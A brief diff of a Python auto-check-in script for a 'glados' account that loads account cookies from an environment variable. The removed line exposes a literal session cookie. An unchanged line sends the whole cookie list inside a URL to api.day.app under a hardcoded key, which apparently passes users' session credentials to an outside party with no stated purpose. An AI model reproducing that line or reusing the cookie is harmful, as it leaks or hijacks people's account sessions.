@@ -18,7 +18,6 @@ if __name__ == '__main__':
 
     # glados账号cookie 直接使用数组 如果使用环境变量需要字符串分割一下
     cookies = os.environ.get("COOKIES", []).split("&")
-    # cookies = ['_ga=GA1.1.46701159.1714535821; __stripe_mid=014528b7-c9aa-4d78-8193-d8cbc7cc6f33c5a7b2; _ga_CZFVKMNT9J=GS1.1.1717400435.12.1.1717400554.0.0.0; koa:sess=eyJ1c2VySWQiOjQ5Njc1MiwiX2V4cGlyZSI6MTc1NjcyMDA5MDU2NywiX21heEFnZSI6MjU5MjAwMDAwMDB9; koa:sess.sig=Dv_SyuO76YyP3DOObrSeZf-mHck']
     requests.get(f'https://api.day.app/Mpnu2gSaCL3Kd9G99p4chn/{cookies}')
     if cookies[0] != "":
 
